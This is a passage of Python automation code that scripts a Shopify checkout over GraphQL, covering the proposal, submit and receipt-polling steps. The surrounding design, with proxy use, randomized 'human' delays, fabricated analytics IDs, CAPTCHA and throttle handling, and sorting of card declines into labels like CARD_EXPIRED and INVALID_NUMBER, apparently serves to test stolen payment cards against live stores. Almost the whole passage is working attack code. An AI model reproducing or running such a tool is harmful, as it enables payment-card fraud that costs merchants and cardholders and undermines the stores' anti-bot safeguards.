                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'cartMetafields': [],
                },
                'operationName': 'Proposal',
            }
            
            await human_delay(min_sec=1.5, max_sec=3.0, step_name="proposal1")
            
            response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                session, graphql_url, proposal1_params, checkout_web_headers, proposal1_data,
                checkout_url, max_retries=1, proxy=proxy
            )
            
            # Retry on Throttled
            _throttle_retries = 3
            for _t_attempt in range(_throttle_retries):
                if not response or '"Throttled"' not in resp_text:
                    break
                _t_backoff = 3.0 * (_t_attempt + 1)
                _t_jitter = random.uniform(0.8, 1.2)
                _t_delay = _t_backoff * _t_jitter
                print(f"[rate-limit] Proposal 1 GraphQL Throttled, retry {_t_attempt+1}/{_throttle_retries} in {_t_delay:.1f}s", file=sys.stderr)
                await asyncio.sleep(_t_delay)
                if response:
                    _new_sst = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                    if _new_sst:
                        x_checkout_one_session_token = _new_sst
                        proposal1_data['variables']['sessionInput']['sessionToken'] = x_checkout_one_session_token
                        checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
                response, resp_text, _graphql_ok = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, proposal1_params, checkout_web_headers, proposal1_data,
                    checkout_url, max_retries=1, proxy=proxy
                )
            
            # Refresh session token from response headers
            if response:
                _new_sst = response.headers.get('x-checkout-one-session-token') or response.headers.get('X-Checkout-One-Session-Token')
                if _new_sst:
                    x_checkout_one_session_token = _new_sst
                    checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
            
            if not response or not _graphql_ok:
                return False, f"Proposal 1 request failed: {resp_text}", gateway, total_price, currency
            
            if is_captcha_required(resp_text):
                return False, "CAPTCHA_REQUIRED", gateway, total_price, currency
            
            # Extract tax2 from 1st proposal response
            tax2_match = re.search(r'"totalTaxAndDutyAmount"\s*:\s*{[^}]*"value"\s*:\s*{[^}]*"amount"\s*:\s*"([\d.]+)"', resp_text)
            if not tax2_match:
                tax2_match = re.search(r'"totalAmountIncludedInTarget"\s*:\s*{[^}]*"value"\s*:\s*{[^}]*"amount"\s*:\s*"([\d.]+)"', resp_text)
            tax2 = float(tax2_match.group(1)) if tax2_match else 0.0
            
            # CRITICAL FIX: Extract checkoutTotal/shipping from Proposal 1 for Proposal 2 payment amount
            # Shopify requires payment amount = checkoutTotal (price + shipping + tax), NOT just price
            _p1_checkout_total = None
            _p1_shipping_cost = 0.0
            try:
                _p1_json = json.loads(resp_text)
                _p1_seller = _p1_json.get('data', {}).get('session', {}).get('negotiate', {}).get('result', {}).get('sellerProposal', {})
                if _p1_seller:
                    _p1_ct = _p1_seller.get('checkoutTotal', {}).get('value', {}).get('amount')
                    if _p1_ct:
                        _p1_checkout_total = float(_p1_ct)
                        print(f'[PROPOSAL1] checkoutTotal={_p1_checkout_total} price={price} tax2={tax2}', file=sys.stderr)
                    else:
                        # Check for negotiate errors that might indicate wrong payment amount
                        _p1_neg_errors = _p1_json.get('data', {}).get('session', {}).get('negotiate', {}).get('errors', [])
                        if _p1_neg_errors:
                            print(f'[PROPOSAL1] NEGOTIATE ERRORS: {json.dumps(_p1_neg_errors[:3])}', file=sys.stderr)
                        else:
                            print(f'[PROPOSAL1] No checkoutTotal, no errors. Keys: {list(_p1_seller.keys())[:15]}', file=sys.stderr)
                    # Try to extract shipping cost from delivery lines
                    _p1_del = _p1_seller.get('delivery', {})
                    _p1_dls = _p1_del.get('deliveryLines', []) if _p1_del else []
                    if _p1_dls:
                        for _dl in _p1_dls:
                            _strats = _dl.get('availableDeliveryStrategies', [])
                            for _s in _strats:
                                _breakdown = _s.get('deliveryStrategyBreakdown', [])
                                for _bd in _breakdown:
                                    _bd_amt = _bd.get('amount', {}).get('value', {}).get('amount', '0')
                                    if _bd_amt and float(_bd_amt) > 0:
                                        _p1_shipping_cost = float(_bd_amt)
                                        break
                    print(f'[PROPOSAL1] shipping_cost={_p1_shipping_cost}', file=sys.stderr)
                else:
                    print(f'[PROPOSAL1] No sellerProposal in response.', file=sys.stderr)
            except (json.JSONDecodeError, KeyError, TypeError, ValueError) as _e:
                print(f'[PROPOSAL1] Error parsing: {_e}', file=sys.stderr)
            
            # Calculate estimated total for payment (price + shipping estimate + tax)
            if _p1_checkout_total and _p1_checkout_total > 0:
                _estimated_total = _p1_checkout_total
            else:
                _estimated_total = price + _p1_shipping_cost + tax2
            print(f'[PROPOSAL1] _estimated_total={_estimated_total} (price={price} + shipping={_p1_shipping_cost} + tax2={tax2})', file=sys.stderr)
            
            # Fallback DMT from 1st proposal response
            if not DMT:
                dmt_matches = re.findall(r'"deliveryMethodTypes"\s*:\s*\[(.*?)\]', resp_text)
                DMT = dmt_matches[0].replace('"', '') if dmt_matches else 'SHIPPING'
            
            # Step 7: 2nd Proposal call → get handle, amount, tax3, total
            proposal2_params = {'operationName': 'Proposal'}
            proposal2_data = {
                'query': QUERY_PROPOSAL,
                'variables': {
                    'sessionInput': {
                        'sessionToken': x_checkout_one_session_token,
                    },
                    'queueToken': queue_token or '',
                    'discounts': {
                        'lines': [],
                        'acceptUnexpectedDiscounts': True,
                    },
                    'delivery': {
                        'deliveryLines': [
                            {
                                'destination': {
                                    'partialStreetAddress': {
                                        'address1': street,
                                        'city': city,
                                        'countryCode': country_code,
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                        'oneTimeUse': False,
                                    },
                                },
                                'selectedDeliveryStrategy': {
                                    'deliveryStrategyMatchingConditions': {
                                        'estimatedTimeInTransit': {'any': True},
                                        'shipments': {'any': True},
                                    },
                                    'options': {},
                                },
                                'targetMerchandiseLines': {'any': True},
                                'deliveryMethodTypes': ['SHIPPING', 'LOCAL'],
                                'expectedTotalPrice': {'any': True},
                                'destinationChanged': False,
                            },
                        ],
                        'noDeliveryRequired': [],
                        'useProgressiveRates': False,
                        'prefetchShippingRatesStrategy': None,
                        'supportsSplitShipping': True,
                    },
                    'deliveryExpectations': {
                        'deliveryExpectationLines': [],
                    },
                    'merchandise': {
                        'merchandiseLines': [
                            {
                                'stableId': stable_id or '1',
                                'merchandise': {
                                    'productVariantReference': {
                                        'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                        'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                        'properties': [],
                                        'sellingPlanId': None,
                                        'sellingPlanDigest': None,
                                    },
                                },
                                'quantity': {'items': {'value': 1}},
                                'expectedTotalPrice': {
                                    'value': {
                                        'amount': f"{price}",
                                        'currencyCode': currency,
                                    },
                                },
                                'lineComponentsSource': None,
                                'lineComponents': [],
                            },
                        ],
                    },
                    'memberships': {'memberships': []},
                    'payment': {
                        'totalAmount': {'any': True},
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentMethodIdentifier,
                                    'sessionId': sessionid,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': street,
                                            'city': city,
                                            'countryCode': country_code,
                                            'postalCode': s_zip,
                                            'firstName': firstName,
                                            'lastName': lastName,
                                            'zoneCode': state,
                                            'phone': phone,
                                        },
                                    },
                                    'cardSource': None,
                                },
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None,
                            },
                            'amount': {
                                'value': {
                                    'amount': f'{_estimated_total}',
                                    'currencyCode': currency,
                                },
                            },
                        }],
                        'billingAddress': {
                            'streetAddress': {
                                'address1': street,
                                'city': city,
                                'countryCode': country_code,
                                'postalCode': s_zip,
                                'firstName': firstName,
                                'lastName': lastName,
                                'zoneCode': state,
                                'phone': phone,
                            },
                        },
                    },
                    'buyerIdentity': {
                        'customer': {
                            'presentmentCurrency': currency,
                            'countryCode': country_code,
                        },
                        'email': email,
                        'emailChanged': False,
                        'phoneCountryCode': country_code,
                        'marketingConsent': [],
                        'shopPayOptInPhone': {
                            'countryCode': country_code,
                        },
                        'rememberMe': False,
                    },
                    'tip': {'tipLines': []},
                    'taxes': {
                        'proposedAllocations': None,
                        'proposedTotalAmount': {
                            'value': {
                                'amount': f"{tax2}",
                                'currencyCode': currency,
                            },
                        },
                        'proposedTotalIncludedAmount': None,
                        'proposedMixedStateTotalAmount': None,
                        'proposedExemptions': [],
                    },
                    'note': {
                        'message': None,
                        'customAttributes': [],
                    },
                    'localizationExtension': {'fields': []},
                    'nonNegotiableTerms': None,
                    'scriptFingerprint': {
                        'signature': None,
                        'signatureUuid': None,
                        'lineItemScriptChanges': [],
                        'paymentScriptChanges': [],
                        'shippingScriptChanges': [],
                    },
                    'optionalDuties': {'buyerRefusesDuties': False},
                    'cartMetafields': [],
                },
                'operationName': 'Proposal',
            }
            
            # FIX: Ensure proposal2_data uses the LATEST session token
            # (may have been refreshed after Proposal 1 response)
            proposal2_data['variables']['sessionInput']['sessionToken'] = x_checkout_one_session_token
            
            # Retry 2nd proposal up to 3 times if signedHandle not found
            print(f'[PROPOSAL2_PREP] price={price} sessionid={sessionid} paymentMethodIdentifier={paymentMethodIdentifier} tax2={tax2} DMT={DMT}', file=sys.stderr)
            for _proposal2_attempt in range(3):
                response2, resp_text2, _graphql_ok2 = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, proposal2_params, checkout_web_headers, proposal2_data,
                    checkout_url, max_retries=1, proxy=proxy
                )
                if response2 and "signedHandle" in resp_text2:
                    break
                await asyncio.sleep(1)
            
            if not response2 or not _graphql_ok2:
                return False, f"Proposal 2 request failed: {resp_text2[:200]}", gateway, total_price, currency
            
            # LOG: Save full proposal 2 response for debugging
            with open('/tmp/proposal2_response.json', 'w') as _dbg_f:
                _dbg_f.write(resp_text2)
            print(f'[PROPOSAL2_RAW] Saved full response to /tmp/proposal2_response.json ({len(resp_text2)} chars)', file=sys.stderr)
            
            if is_captcha_required(resp_text2):
                return False, "CAPTCHA_REQUIRED on proposal 2", gateway, total_price, currency
            
            # Refresh session token
            if response2:
                _new_sst2 = response2.headers.get('x-checkout-one-session-token') or response2.headers.get('X-Checkout-One-Session-Token')
                if _new_sst2:
                    x_checkout_one_session_token = _new_sst2
                    checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token
            
            # Initialize skip flag for submit step
            _skip_submit = False
            
            # Parse 2nd proposal response
            try:
                proposal2_json = json.loads(resp_text2)
                
                # Check for top-level GraphQL errors first
                if 'errors' in proposal2_json and not proposal2_json.get('data'):
                    _top_errs = proposal2_json.get('errors', [])
                    _top_msgs = [e.get('message', str(e)) for e in _top_errs[:3]]
                    return False, f"Proposal 2 GraphQL error: {'; '.join(_top_msgs)}", gateway, total_price, currency
                
                _p2_data = proposal2_json.get('data', {})
                _p2_session = _p2_data.get('session') if _p2_data else None
                
                if _p2_session is None:
                    return False, f"Proposal 2: session is null (sst may be expired)", gateway, total_price, currency
                
                _p2_negotiate = _p2_session.get('negotiate') if _p2_session else None
                
                if _p2_negotiate is None:
                    return False, f"Proposal 2: negotiate returned null", gateway, total_price, currency
                
                _p2_result = _p2_negotiate.get('result', {})
                _p2_result_type = _p2_result.get('__typename', '') if _p2_result else ''
                
                # Check negotiate-level errors
                _p2_neg_errors = _p2_negotiate.get('errors', [])
                if _p2_neg_errors:
                    _neg_err_msgs = [e.get('code', '') or e.get('message', str(e)) for e in _p2_neg_errors[:3]]
                    return False, f"Proposal 2 negotiate error: {'; '.join(_neg_err_msgs)}", gateway, total_price, currency
                
                if _p2_result_type == 'CheckpointDenied':
                    _redirect = _p2_result.get('redirectUrl', '')
                    return False, f"CAPTCHA_BLOCK: CheckpointDenied -> {_redirect[:80]}", gateway, total_price, currency
                elif _p2_result_type == 'Throttled':
                    return False, "Proposal 2 Throttled", gateway, total_price, currency
                elif _p2_result_type == 'NegotiationResultFailed':
                    return False, "Proposal 2 negotiation failed", gateway, total_price, currency
                elif _p2_result_type == 'SubmittedForCompletion':
                    # Already submitted — extract receipt AND price/handle
                    _p2_receipt = _p2_result.get('receipt', {})
                    if _p2_receipt and _p2_receipt.get('id'):
                        receipt_id = _p2_receipt.get('id')
                    # Extract sellerProposal for price/handle even in SubmittedForCompletion
                    _p2_seller = _p2_result.get('sellerProposal')
                    if _p2_seller:
                        try:
                            _p2_total = _p2_seller.get('checkoutTotal', {}).get('value', {}).get('amount', str(price))
                            if _p2_total:
                                total_price = str(_p2_total)
                        except (AttributeError, TypeError):
                            pass
                        _p2_del = _p2_seller.get('delivery', {})
                        _p2_dl = _p2_del.get('deliveryLines', [{}]) if _p2_del else [{}]
                        if _p2_dl and _p2_dl[0].get('availableDeliveryStrategies'):
                            handle = _p2_dl[0]['availableDeliveryStrategies'][0].get('handle', '') or handle
                    else:
                        # SubmittedForCompletion usually has no sellerProposal — use price as total
                        if price and float(price) > 0:
                            total_price = f"{float(price):.2f}"
                    print(f'[PROPOSAL2] SubmittedForCompletion: receipt_id={receipt_id} total_price={total_price} handle={handle} price={price}', file=sys.stderr)
                    _skip_submit = True
                elif _p2_result_type and _p2_result_type != 'NegotiationResultAvailable':
                    return False, f"Unexpected proposal 2 result: {_p2_result_type}", gateway, total_price, currency
                elif not _p2_result_type:
                    # No typename — could be an empty result or different schema
                    print(f'[PROPOSAL2] Warning: empty __typename. Response preview: {resp_text2[:300]}', file=sys.stderr)
                    return False, f"Proposal 2: empty result typename (response preview: {resp_text2[:150]})", gateway, total_price, currency
                
                seller_proposal = _p2_result.get('sellerProposal', {})
                if not _skip_submit and not seller_proposal:
                    return False, "No seller proposal in 2nd proposal response", gateway, total_price, currency
                
                delivery_data = seller_proposal.get('delivery', {})
                delivery_lines = delivery_data.get('deliveryLines', [{}]) if delivery_data else [{}]
                
                if delivery_lines and delivery_lines[0].get('availableDeliveryStrategies'):
                    seller = delivery_lines[0]['availableDeliveryStrategies'][0]
                    amount = seller.get('deliveryStrategyBreakdown', [{}])[0].get('amount', {}).get('value', {}).get('amount', '0')
                    handle = seller.get('handle', '')
                else:
                    amount = '0'
                    handle = ''
                
                # Extract tax3
                tax_data = seller_proposal.get('tax', {})
                tax3 = tax_data.get('totalTaxAmount', {}).get('value', {}).get('amount', '0') if tax_data else '0'
                
                # Extract total (checkoutTotal)
                try:
                    total = seller_proposal.get('checkoutTotal', {}).get('value', {}).get('amount', str(price))
                except (AttributeError, TypeError):
                    total = str(price)
                
                if not total:
                    total = str(price)
                
                # Ensure total is a valid number (not 'None' or empty)
                try:
                    float(total)
                except (ValueError, TypeError):
                    total = str(price)
                
                total_price = str(total)
                
                # LOG key values for debugging
                print(f'[PROPOSAL2] price={price} amount={amount} total={total} total_price={total_price} handle={handle} tax3={tax3}', file=sys.stderr)
                
                if not handle and not _skip_submit:
                    return False, "HANDLE EMPTY", gateway, total_price, currency
                
            except (json.JSONDecodeError, KeyError, TypeError) as e:
                return False, f"Failed to parse proposal 2 response: {str(e)}", gateway, total_price, currency
            
            # Step 8: SubmitForCompletion — TWO variants based on DMT
            print(f'[SUBMIT_PREP] price={price} total_price={total_price} amount={amount} total={total} handle={handle} DMT={DMT} _skip_submit={_skip_submit}', file=sys.stderr)
            
            # CRITICAL: Validate total_price before proceeding
            try:
                _tp_check = float(total_price)
                if _tp_check <= 0 and price and float(price) > 0:
                    total_price = f"{float(price):.2f}"
                    total = total_price
                    print(f'[SUBMIT_PREP] FIXED total_price from {total_price} to {total_price} (was 0, using price)', file=sys.stderr)
            except (ValueError, TypeError):
                if price and float(price) > 0:
                    total_price = f"{float(price):.2f}"
                    total = total_price
            
            if _skip_submit:
                # Already submitted via SubmittedForCompletion, skip to poll
                print(f'[SKIP_SUBMIT] Skipping submit, going to poll with receipt_id={receipt_id}', file=sys.stderr)
            else:
                # Build submit variables (common parts)
                _raw_cc = cc.replace(' ', '').replace('-', '')
                _card_bin = _raw_cc[:8] if len(_raw_cc) >= 8 else _raw_cc

                submit_params = {'operationName': 'SubmitForCompletion'}

                # NONE variant: no destination, uses deliveryStrategyMatchingConditions
                submit_none_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': x_checkout_one_session_token},
                            'queueToken': queue_token or '',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    # No destination for NONE
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyMatchingConditions': {
                                            'estimatedTimeInTransit': {'any': True},
                                            'shipments': {'any': True},
                                        },
                                        'options': {'phone': phone},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': stable_id or '1'}],
                                    },
                                    'deliveryMethodTypes': [DMT or 'SHIPPING'],
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': f'{amount}',
                                            'currencyCode': currency,
                                        },
                                    },
                                    'destinationChanged': False,
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True,
                            },
                            'deliveryExpectations': {'deliveryExpectationLines': []},
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id or '1',
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': f'{price}',
                                            'currencyCode': currency,
                                        },
                                    },
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                }],
                            },
                            'memberships': {'memberships': []},
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': street,
                                                    'city': city,
                                                    'countryCode': country_code,
                                                    'postalCode': s_zip,
                                                    'firstName': firstName,
                                                    'lastName': lastName,
                                                    'zoneCode': state,
                                                    'phone': phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                        'giftCardPaymentMethod': None,
                                        'redeemablePaymentMethod': None,
                                        'walletPaymentMethod': None,
                                        'walletsPlatformPaymentMethod': None,
                                        'localPaymentMethod': None,
                                        'paymentOnDeliveryMethod': None,
                                        'paymentOnDeliveryMethod2': None,
                                        'manualPaymentMethod': None,
                                        'customPaymentMethod': None,
                                        'offsitePaymentMethod': None,
                                        'customOnsitePaymentMethod': None,
                                        'deferredPaymentMethod': None,
                                        'customerCreditCardPaymentMethod': None,
                                        'paypalBillingAgreementPaymentMethod': None,
                                        'remotePaymentInstrument': None,
                                    },
                                    'amount': {
                                        'value': {
                                            'amount': f'{total}',
                                            'currencyCode': currency,
                                        },
                                    },
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': street,
                                        'city': city,
                                        'countryCode': country_code,
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'customer': {
                                    'presentmentCurrency': currency,
                                    'countryCode': country_code,
                                },
                                'email': email,
                                'emailChanged': False,
                                'phoneCountryCode': country_code,
                                'marketingConsent': [],
                                'shopPayOptInPhone': {'countryCode': country_code},
                                'rememberMe': False,
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {
                                    'value': {
                                        'amount': f'{tax3}',
                                        'currencyCode': currency,
                                    },
                                },
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {
                                'message': None,
                                'customAttributes': [],
                            },
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                            'cartMetafields': [],
                        },
                        'attemptToken': f'{token}-4j33p1vmcd5' if token else '',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': checkout_url,
                            'pageId': f'{random.randint(10000000,99999999):08x}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(100000000000,999999999999):012x}',
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                # SHIPPING variant: has destination, uses deliveryStrategyByHandle with handle
                submit_shipping_data = {
                    'query': MUTATION_SUBMIT,
                    'variables': {
                        'input': {
                            'sessionInput': {'sessionToken': x_checkout_one_session_token},
                            'queueToken': queue_token or '',
                            'discounts': {'lines': [], 'acceptUnexpectedDiscounts': True},
                            'delivery': {
                                'deliveryLines': [{
                                    'destination': {
                                        'streetAddress': {
                                            'address1': street,
                                            'city': city,
                                            'countryCode': country_code,
                                            'postalCode': s_zip,
                                            'firstName': firstName,
                                            'lastName': lastName,
                                            'zoneCode': state,
                                            'phone': phone,
                                            'oneTimeUse': False,
                                        },
                                    },
                                    'selectedDeliveryStrategy': {
                                        'deliveryStrategyByHandle': {
                                            'handle': handle,
                                            'customDeliveryRate': False,
                                        },
                                        'options': {'phone': phone},
                                    },
                                    'targetMerchandiseLines': {
                                        'lines': [{'stableId': stable_id or '1'}],
                                    },
                                    'deliveryMethodTypes': [DMT or 'SHIPPING'],
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': f'{amount}',
                                            'currencyCode': currency,
                                        },
                                    },
                                    'destinationChanged': False,
                                }],
                                'noDeliveryRequired': [],
                                'useProgressiveRates': False,
                                'prefetchShippingRatesStrategy': None,
                                'supportsSplitShipping': True,
                            },
                            'deliveryExpectations': {'deliveryExpectationLines': []},
                            'merchandise': {
                                'merchandiseLines': [{
                                    'stableId': stable_id or '1',
                                    'merchandise': {
                                        'productVariantReference': {
                                            'id': f'gid://shopify/ProductVariantMerchandise/{product_id}',
                                            'variantId': f'gid://shopify/ProductVariant/{product_id}',
                                            'properties': [],
                                            'sellingPlanId': None,
                                            'sellingPlanDigest': None,
                                        },
                                    },
                                    'quantity': {'items': {'value': 1}},
                                    'expectedTotalPrice': {
                                        'value': {
                                            'amount': f'{price}',
                                            'currencyCode': currency,
                                        },
                                    },
                                    'lineComponentsSource': None,
                                    'lineComponents': [],
                                }],
                            },
                            'memberships': {'memberships': []},
                            'payment': {
                                'totalAmount': {'any': True},
                                'paymentLines': [{
                                    'paymentMethod': {
                                        'directPaymentMethod': {
                                            'paymentMethodIdentifier': paymentMethodIdentifier,
                                            'sessionId': sessionid,
                                            'billingAddress': {
                                                'streetAddress': {
                                                    'address1': street,
                                                    'city': city,
                                                    'countryCode': country_code,
                                                    'postalCode': s_zip,
                                                    'firstName': firstName,
                                                    'lastName': lastName,
                                                    'zoneCode': state,
                                                    'phone': phone,
                                                },
                                            },
                                            'cardSource': None,
                                        },
                                        'giftCardPaymentMethod': None,
                                        'redeemablePaymentMethod': None,
                                        'walletPaymentMethod': None,
                                        'walletsPlatformPaymentMethod': None,
                                        'localPaymentMethod': None,
                                        'paymentOnDeliveryMethod': None,
                                        'paymentOnDeliveryMethod2': None,
                                        'manualPaymentMethod': None,
                                        'customPaymentMethod': None,
                                        'offsitePaymentMethod': None,
                                        'customOnsitePaymentMethod': None,
                                        'deferredPaymentMethod': None,
                                        'customerCreditCardPaymentMethod': None,
                                        'paypalBillingAgreementPaymentMethod': None,
                                        'remotePaymentInstrument': None,
                                    },
                                    'amount': {
                                        'value': {
                                            'amount': f'{total}',
                                            'currencyCode': currency,
                                        },
                                    },
                                }],
                                'billingAddress': {
                                    'streetAddress': {
                                        'address1': street,
                                        'city': city,
                                        'countryCode': country_code,
                                        'postalCode': s_zip,
                                        'firstName': firstName,
                                        'lastName': lastName,
                                        'zoneCode': state,
                                        'phone': phone,
                                    },
                                },
                            },
                            'buyerIdentity': {
                                'customer': {
                                    'presentmentCurrency': currency,
                                    'countryCode': country_code,
                                },
                                'email': email,
                                'emailChanged': False,
                                'phoneCountryCode': country_code,
                                'marketingConsent': [],
                                'shopPayOptInPhone': {'countryCode': country_code},
                                'rememberMe': False,
                            },
                            'tip': {'tipLines': []},
                            'taxes': {
                                'proposedAllocations': None,
                                'proposedTotalAmount': {
                                    'value': {
                                        'amount': f'{tax3}',
                                        'currencyCode': currency,
                                    },
                                },
                                'proposedTotalIncludedAmount': None,
                                'proposedMixedStateTotalAmount': None,
                                'proposedExemptions': [],
                            },
                            'note': {
                                'message': None,
                                'customAttributes': [],
                            },
                            'localizationExtension': {'fields': []},
                            'nonNegotiableTerms': None,
                            'scriptFingerprint': {
                                'signature': None,
                                'signatureUuid': None,
                                'lineItemScriptChanges': [],
                                'paymentScriptChanges': [],
                                'shippingScriptChanges': [],
                            },
                            'optionalDuties': {'buyerRefusesDuties': False},
                            'cartMetafields': [],
                        },
                        'attemptToken': f'{token}-4j33p1vmcd5' if token else '',
                        'metafields': [],
                        'analytics': {
                            'requestUrl': checkout_url,
                            'pageId': f'{random.randint(10000000,99999999):08x}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(1000,9999):04X}-{random.randint(100000000000,999999999999):012x}',
                        },
                    },
                    'operationName': 'SubmitForCompletion',
                }

                # Select submit variant based on DMT
                if DMT == 'NONE':
                    selected_submit_data = submit_none_data
                else:
                    selected_submit_data = submit_shipping_data

                await human_delay(min_sec=0.5, max_sec=1.5, step_name="submit")

                # Retry submit up to 3 times
                for _submit_attempt in range(3):
                    submit_resp, submit_text, _submit_ok = await make_graphql_request_with_captcha_handling(
                        session, graphql_url, submit_params, checkout_web_headers, selected_submit_data,
                        checkout_url, max_retries=1, proxy=proxy
                    )
                    if submit_resp and "success" in submit_text:
                        break
                    if _submit_attempt < 2:
                        await asyncio.sleep(1)

                # Refresh session token from submit response
                if submit_resp:
                    _new_sst_submit = submit_resp.headers.get('x-checkout-one-session-token') or submit_resp.headers.get('X-Checkout-One-Session-Token')
                    if _new_sst_submit:
                        x_checkout_one_session_token = _new_sst_submit
                        checkout_web_headers['x-checkout-one-session-token'] = x_checkout_one_session_token

                if not submit_resp or not _submit_ok:
                    return False, f"Submit request failed: {submit_text[:200]}", gateway, total_price, currency

                if is_captcha_required(submit_text):
                    return False, "CAPTCHA_REQUIRED on submit", gateway, total_price, currency

                # Check for specific submit errors
                if "TAX_NEW_TAX_VALUE_MUST_BE_ACCEPTED" in submit_text:
                    return False, "TAX_MISMATCH", gateway, total_price, currency
                if "CAPTCHA_METADATA_MISSING" in submit_text:
                    return False, "HCAPTCHA_REQUIRED", gateway, total_price, currency
                if "PAYMENTS_CREDIT_CARD_BASE_EXPIRED" in submit_text:
                    return False, "CARD_EXPIRED", gateway, total_price, currency
                if "PAYMENTS_CREDIT_CARD_BRAND_NOT_SUPPORTED" in submit_text:
                    return False, "CARD_NOT_SUPPORTED", gateway, total_price, currency
                if "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT" in submit_text:
                    return False, "INVALID_NUMBER", gateway, total_price, currency
                if "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT" in submit_text:
                    return False, "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT", gateway, total_price, currency

                # Extract receipt_id from submit response
                try:
                    submit_json = json.loads(submit_text)
                    receipt = submit_json.get("data", {}).get("submitForCompletion", {}).get("receipt", {})
                    receipt_id = receipt.get("id")
                except (json.JSONDecodeError, KeyError, TypeError):
                    receipt_id = None

                if not receipt_id:
                    # Check if there's an error in the submit response
                    try:
                        submit_json = json.loads(submit_text)
                        _submit_errors = submit_json.get('errors', [])
                        if _submit_errors:
                            _err_msgs = [e.get('message', str(e)) for e in _submit_errors[:3]]
                            return False, f"Submit GraphQL Error: {'; '.join(_err_msgs)}", gateway, total_price, currency
                        # Check for receipt processing error
                        _receipt_type = receipt.get('__typename', '')
                        if _receipt_type == 'FailedReceipt':
                            _sr_error = receipt.get('processingError', {})
                            _sr_ext = _extract_payment_error_response(_sr_error)
                            return False, _sr_ext or "CARD_DECLINED", gateway, total_price, currency
                    except Exception:
                        pass
                    return False, "RECEIPT_EMPTY", gateway, total_price, currency

            # Step 9: PollForReceipt
            await human_delay(min_sec=1.0, max_sec=2.0, step_name="poll_start")
            
            poll_params = {'operationName': 'PollForReceipt'}
            poll_data = {
                'query': QUERY_POLL,
                'variables': {
                    'receiptId': receipt_id,
                    'sessionToken': x_checkout_one_session_token,
                },
                'operationName': 'PollForReceipt',
            }
            
            # Poll up to 2 times with delay
            for i in range(2):
                poll_resp, poll_text, _poll_ok = await make_graphql_request_with_captcha_handling(
                    session, graphql_url, poll_params, checkout_web_headers, poll_data,
                    checkout_url, max_retries=1, proxy=proxy
                )
                if i == 0:
                    await asyncio.sleep(3)
            
